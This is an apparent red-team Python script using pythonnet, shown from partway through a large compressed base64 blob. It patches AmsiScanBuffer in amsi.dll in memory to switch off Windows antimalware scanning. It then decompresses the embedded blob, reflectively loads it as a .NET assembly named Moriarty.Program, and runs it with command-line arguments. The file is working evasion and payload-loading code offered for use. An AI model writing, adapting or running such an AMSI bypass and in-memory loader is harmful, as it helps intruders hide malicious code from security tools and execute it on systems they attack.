OW3+5nv9Q13wLnbwWVspvSZCdeW9DmRpjr1FxJnahCeY1geazLem/PGP8MFMuL6BP6MT7BN10hFSLM2tYcj1/HG7Oynw7OrJk9GXttH3HA1GZv/qgUuL9KvS718MIx4pCnKZ/mCXSv5kXcD6eKb45jgqg9pEqn3OZTjnkL7xP4oY+GateBuIZN0OUbNdIj9VFGx+yqZks1qQe+nzfK6TXotfnsmRHetkK/xuqND7E/rz6qDXHINCblm57FL1y7bsMizirLPbbBbQLg238HFEr2bodRjv/5NU/OueEwZMJcxAzXB6oCis2mw7p4dkcBn2tZWhgNKsj/a0xGN9fbokcCgngw0r/QWe4uboqapUwVF9CQjgZ2Jnsbk9i49Hk1Wxru3J3rZvG7l9t54YzQZDw7UBJR4tKe7U09athcNfChMUVKFWdaQs2jiv4DSE42DgHsHV/X1xUx7lsFoX1+gyiihP7Ez2c/mHCdIT62BGTmTppks8xp3EoZFSb2DLZF1x/QdenKCpdYFUqVklmPY7wPFG/QBPabE2I8EoknTdmNA2dltmAuMBDqjsaRuMiUKqcpBjUV6VRbtTVUpIeC6qcoS6kqaRidRCfyhmunE8X/3cXX/A7N22Io="


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    print(type(command))
    command_array = Array[str](command)
    print(type(command_array))
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("Moriarty.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    if method == None:
        method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        print(method)
    # Convert your command to a .NET string array
    print("confirm jagged array")
    command_args = System.Array[System.Object]([command_array])
    print(type(command_args[0]))

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()